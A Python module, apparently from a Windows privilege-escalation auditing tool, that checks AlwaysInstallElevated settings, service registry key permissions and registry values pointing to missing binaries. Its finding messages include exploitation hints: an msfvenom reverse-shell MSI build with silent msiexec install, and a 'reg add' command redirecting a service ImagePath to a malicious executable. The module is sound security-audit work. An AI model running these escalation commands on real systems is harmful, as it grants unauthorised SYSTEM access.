import os
import re
from typing import List, Optional

from .utils import finding, print_info, print_warning, is_windows

MODULE_NAME = "Insecure Registry Keys"

def _key_writable_by_non_admin(hive, key_path: str) -> bool:
    if not is_windows():
        return False
    try:
        import winreg

        handle = winreg.OpenKey(hive, key_path, 0, winreg.KEY_SET_VALUE)
        winreg.CloseKey(handle)

        _PROTECTED_HKLM_PREFIXES = (
            r"SYSTEM\CurrentControlSet",
            r"SOFTWARE\Microsoft\Windows NT",
            r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
            r"SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce",
            r"SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Run",
        )
        # For HKLM keys matching protected prefixes, verify with a secondary
        # RegGetKeySecurity check rather than trusting the open succeeded.
        import winreg
        if hive == winreg.HKEY_LOCAL_MACHINE:
            norm = key_path.upper()
            for prefix in _PROTECTED_HKLM_PREFIXES:
                if norm.startswith(prefix.upper()):
                    return _key_dacl_allows_users_write(hive, key_path)
        return True
    except PermissionError:
        return False
    except FileNotFoundError:
        return False
    except Exception:
        return False


def _key_dacl_allows_users_write(hive, key_path: str) -> bool:

    if not is_windows():
        return False
    try:
        import ctypes
        import ctypes.wintypes
        import winreg

        # Open the key with READ_CONTROL
        handle = winreg.OpenKey(hive, key_path, 0, winreg.KEY_READ | 0x00020000)

        # RegGetKeySecurity(hKey, DACL_SECURITY_INFORMATION=4, pSecurityDescriptor, lpcbSecurityDescriptor)
        needed = ctypes.wintypes.DWORD(0)
        ctypes.windll.advapi32.RegGetKeySecurity(
            handle.handle if hasattr(handle, 'handle') else int(handle),
            4, None, ctypes.byref(needed)
        )
        if needed.value == 0:
            winreg.CloseKey(handle)
            return False

        buf = (ctypes.c_byte * needed.value)()
        ret = ctypes.windll.advapi32.RegGetKeySecurity(
            handle.handle if hasattr(handle, 'handle') else int(handle),
            4, buf, ctypes.byref(needed)
        )
        winreg.CloseKey(handle)
        if ret != 0:
            return False

        # Check DACL for Users/Everyone write ACEs
        dacl_present   = ctypes.wintypes.BOOL(0)
        dacl_ptr       = ctypes.c_void_p(0)
        dacl_defaulted = ctypes.wintypes.BOOL(0)
        sd_ptr = ctypes.cast(buf, ctypes.c_void_p)

        if not ctypes.windll.advapi32.GetSecurityDescriptorDacl(
            sd_ptr, ctypes.byref(dacl_present), ctypes.byref(dacl_ptr), ctypes.byref(dacl_defaulted)
        ):
            return False

        if not dacl_present.value or not dacl_ptr.value:
            return True  # NULL DACL = world-writable

        # Check ACE count
        class ACL_SIZE_INFORMATION(ctypes.Structure):
            _fields_ = [("AceCount", ctypes.wintypes.DWORD),
                        ("AclBytesInUse", ctypes.wintypes.DWORD),
                        ("AclBytesFree", ctypes.wintypes.DWORD)]

        acl_info = ACL_SIZE_INFORMATION()
        ctypes.windll.advapi32.GetAclInformation(
            dacl_ptr, ctypes.byref(acl_info), ctypes.sizeof(acl_info), 2  # AclSizeInformation
        )

        # Well-known SIDs: BUILTIN\Users S-1-5-32-545, Everyone S-1-1-0
        users_sid   = _build_well_known_sid(0x22)   # WinBuiltinUsersSid
        everyone_sid = _build_well_known_sid(0x01)  # WinWorldSid

        KEY_WRITE_MASK = 0x20006  # KEY_SET_VALUE | KEY_CREATE_SUB_KEY | KEY_CREATE_LINK

        for i in range(acl_info.AceCount):
            ace_ptr = ctypes.c_void_p(0)
            if ctypes.windll.advapi32.GetAce(dacl_ptr, i, ctypes.byref(ace_ptr)):
                # ACCESS_ALLOWED_ACE: Type(1) Flags(1) Size(2) Mask(4) SidStart(variable)
                ace_type = ctypes.c_ubyte.from_address(ace_ptr.value).value
                if ace_type == 0:  # ACCESS_ALLOWED_ACE_TYPE
                    mask = ctypes.c_ulong.from_address(ace_ptr.value + 4).value
                    sid_start = ace_ptr.value + 8
                    if mask & KEY_WRITE_MASK:
                        if (users_sid and _sids_equal(sid_start, users_sid)) or \
                           (everyone_sid and _sids_equal(sid_start, everyone_sid)):
                            return True
        return False
    except Exception:
        return False


def _build_well_known_sid(well_known_sid_type: int) -> Optional[int]:
    """Return pointer to a well-known SID, or None on failure."""
    try:
        import ctypes
        size = ctypes.wintypes.DWORD(256)
        buf  = (ctypes.c_byte * 256)()
        if ctypes.windll.advapi32.CreateWellKnownSid(
            well_known_sid_type, None, buf, ctypes.byref(size)
        ):
            # Return a copy as a bytes object for comparison
            return bytes(buf[:size.value])
        return None
    except Exception:
        return None


def _sids_equal(sid_addr: int, sid_bytes: bytes) -> bool:
    """Compare a SID at a memory address with a bytes-encoded SID."""
    try:
        import ctypes
        sub_count = ctypes.c_ubyte.from_address(sid_addr + 1).value
        sid_size  = 8 + sub_count * 4
        addr_bytes = (ctypes.c_byte * sid_size).from_address(sid_addr)
        return bytes(addr_bytes) == sid_bytes[:sid_size]
    except Exception:
        return False


def _read_value(hive, key_path: str, value_name: str = "") -> Optional[str]:
    try:
        import winreg
        with winreg.OpenKey(hive, key_path) as key:
            val, _ = winreg.QueryValueEx(key, value_name)
            return str(val)
    except Exception:
        return None


# ── AlwaysInstallElevated ─────────────────────────────────────────────────────
def _check_always_install_elevated() -> List[dict]:
    results = []
    if not is_windows():
        return results
    import winreg
    checks = [
        (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Policies\Microsoft\Windows\Installer", "AlwaysInstallElevated"),
        (winreg.HKEY_CURRENT_USER,  r"Software\Policies\Microsoft\Windows\Installer",  "AlwaysInstallElevated"),
    ]
    count = sum(1 for hive, path, name in checks if _read_value(hive, path, name) == "1")

    if count == 2:
        results.append(finding(
            severity="P1",
            message="AlwaysInstallElevated enabled (both HKLM + HKCU)",
            detail=(
                "Any user can install MSI packages with SYSTEM privileges.\n"
                "Exploit: msfvenom -p windows/x64/shell_reverse_tcp ... -f msi > evil.msi\n"
                "         msiexec /quiet /qn /i evil.msi"
            ),
            module=MODULE_NAME,
        ))
    elif count == 1:
        results.append(finding(
            severity="P4",
            message="AlwaysInstallElevated partially enabled (one hive only — not exploitable alone)",
            detail="Both HKLM and HKCU must be set to 1 for MSI privilege escalation.",
            module=MODULE_NAME,
        ))
    return results


# ── Service registry keys ─────────────────────────────────────────────────────
def _check_service_keys(service_name: str) -> List[dict]:
    results = []
    if not is_windows():
        return results
    import winreg
    base = rf"SYSTEM\CurrentControlSet\Services\{service_name}"
    for sub in ("", r"\Parameters", r"\Security"):
        path = base + sub
        if _key_dacl_allows_users_write(winreg.HKEY_LOCAL_MACHINE, path):
            label = {
                "":             "ImagePath (redirects service binary → SYSTEM exec)",
                r"\Parameters": "Parameters subkey (may control binary args or DLL paths)",
                r"\Security":   "Security descriptor (can grant self full control)",
            }.get(sub, sub)
            results.append(finding(
                severity="P1",
                message=f"Writable service registry key: HKLM\\{path}",
                detail=(
                    f"Key          : HKLM\\{path}\n"
                    f"Writable by  : BUILTIN\\Users (confirmed via DACL inspection)\n"
                    f"Risk         : {label}\n"
                    f"Attack       : reg add HKLM\\{path} /v ImagePath /t REG_EXPAND_SZ "
                    f"/d \"C:\\malicious.exe\" /f"
                ),
                module=MODULE_NAME,
            ))
    return results


# ── App-specific writable keys ────────────────────────────────────────────────
_BINARY_VALUE_NAMES = re.compile(
    r"(?:path|dir|directory|exe|binary|dll|plugin|module|loader|handler|"
    r"command|cmd|install|root|home|base|location)$",
    re.IGNORECASE
)


def _check_app_registry_keys(exe_path: Optional[str]) -> List[dict]:
    """
    Find registry keys specific to the target application and check:
      1. Is the key itself writable? (attacker can add/modify any value)
      2. Do any values point to binary paths that don't exist? (phantom binary via reg)
    """
    results = []
    if not is_windows() or not exe_path:
        return results

    import winreg
    app_name = os.path.splitext(os.path.basename(exe_path))[0]

    # Also try to find vendor key from version info
    vendor_names = [app_name]
    try:
        import pefile
        pe = pefile.PE(exe_path, fast_load=True)
        pe.parse_data_directories(directories=[pefile.DIRECTORY_ENTRY["IMAGE_DIRECTORY_ENTRY_RESOURCE"]])
        if hasattr(pe, "FileInfo"):
            for fi in pe.FileInfo:
                for item in fi:
                    if hasattr(item, "StringTable"):
                        for st in item.StringTable:
                            for k, v in st.entries.items():
                                if k in (b"CompanyName", b"ProductName"):
                                    name = v.decode(errors="ignore").strip()
                                    if name and name not in vendor_names:
                                        vendor_names.append(name)
        pe.close()
    except Exception:
        pass

    candidate_keys = []
    for name in vendor_names:
        candidate_keys += [
            (winreg.HKEY_LOCAL_MACHINE, rf"SOFTWARE\{name}"),
            (winreg.HKEY_LOCAL_MACHINE, rf"SOFTWARE\Wow6432Node\{name}"),
            (winreg.HKEY_CURRENT_USER,  rf"Software\{name}"),
        ]

    for hive, key_path in candidate_keys:
        hive_name = "HKLM" if hive == winreg.HKEY_LOCAL_MACHINE else "HKCU"

        # Confirm key exists
        try:
            with winreg.OpenKey(hive, key_path):
                pass
        except FileNotFoundError:
            continue
        except Exception:
            continue

        # Check writability
        use_dacl = (hive == winreg.HKEY_LOCAL_MACHINE)
        writable = (_key_dacl_allows_users_write(hive, key_path) if use_dacl
                    else _key_writable_by_non_admin(hive, key_path))

        if writable:
            results.append(finding(
                severity="P2",
                message=f"Writable application registry key: {hive_name}\\{key_path}",
                detail=(
                    f"Key          : {hive_name}\\{key_path}\n"
                    f"Writable by  : standard non-admin users\n"
                    f"Risk         : Inspect this key's values for binary paths, DLL references,\n"
                    f"               or plugin directories. Modifying those values may redirect\n"
                    f"               code execution when the application runs."
                ),
                module=MODULE_NAME,
            ))

        # Regardless of writability, scan values for phantom binary paths
        try:
            with winreg.OpenKey(hive, key_path) as key:
                i = 0
                while True:
                    try:
                        val_name, val_data, val_type = winreg.EnumValue(key, i)
                        i += 1
                    except OSError:
                        break

                    if val_type not in (winreg.REG_SZ, winreg.REG_EXPAND_SZ):
                        continue

                    val_str = os.path.expandvars(str(val_data)).strip().strip('"')
                    if not val_str or not re.match(r"[A-Za-z]:\\", val_str):
                        continue

                    # Only flag values whose names suggest they hold binary paths
                    if not _BINARY_VALUE_NAMES.search(str(val_name)):
                        continue

                    # Check if the referenced binary is missing
                    if val_str.lower().endswith((".exe", ".dll")) and not os.path.isfile(val_str):
                        results.append(finding(
                            severity="P2" if writable else "P3",
                            message=f"Registry value points to phantom binary: {val_str}",
                            detail=(
                                f"Key          : {hive_name}\\{key_path}\n"
                                f"Value name   : {val_name}\n"
                                f"Value data   : {val_str}  (FILE DOES NOT EXIST)\n"
                                f"Key writable : {'Yes — attacker can also change the path' if writable else 'No'}\n"
                                f"Risk         : If a process loads from this registry value, "
                                f"planting a binary at '{val_str}' will intercept execution."
                            ),
                            module=MODULE_NAME,
                        ))
        except Exception:
            pass

    return results


# ── Main ──────────────────────────────────────────────────────────────────────
def run(ctx: dict) -> List[dict]:
    findings = []

    if not is_windows():
        print_warning("Registry checks require Windows.")
        return findings

    try:
        import winreg
    except ImportError:
        print_warning("winreg unavailable – registry checks skipped.")
        return findings

    findings.extend(_check_always_install_elevated())

    svc = ctx.get("service_name")
    if svc:
        findings.extend(_check_service_keys(svc))
    else:
        print_info("No service specified — service registry key check skipped (use --service).")

    findings.extend(_check_app_registry_keys(ctx.get("exe_path")))

    if not findings:
        print_info("No insecure registry key issues found.")

    return findings
